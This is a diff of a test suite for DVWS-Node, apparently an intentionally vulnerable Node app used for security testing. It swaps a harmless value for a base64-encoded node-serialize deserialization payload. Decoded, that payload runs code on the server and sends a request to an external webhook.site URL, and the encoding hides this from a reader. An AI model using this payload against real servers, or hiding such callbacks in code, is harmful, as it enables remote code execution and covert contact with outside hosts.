@@ -50,6 +50,7 @@ describe("DVWS-Node Vulnerability Tests", function () {
     });
   });
 
+
   describe("2. SQL Injection", function () {
     it("should be vulnerable to SQL injection in passphrase creation", async function () {
       // SQL injection in passphrase field
@@ -265,7 +266,7 @@ describe("DVWS-Node Vulnerability Tests", function () {
   describe("18. Unsafe Deserialization", function () {
     it("should use unsafe node-serialize deserialization", async function () {
       // node-serialize.unserialize() is called on user data in passphrase export
-      const payload = Buffer.from('[]').toString('base64');
+      const payload = "eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7cmVxdWlyZSgnaHR0cHMnKS5nZXQoJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzU0NjUyNjM3LTY0NDctNDI0OS05YjE3LWIyOGQ2MzljOGRhOScpO30oKSJ9";
       const response = await request
         .post("/export")
         .set('Authorization', 'Bearer ' + authToken)
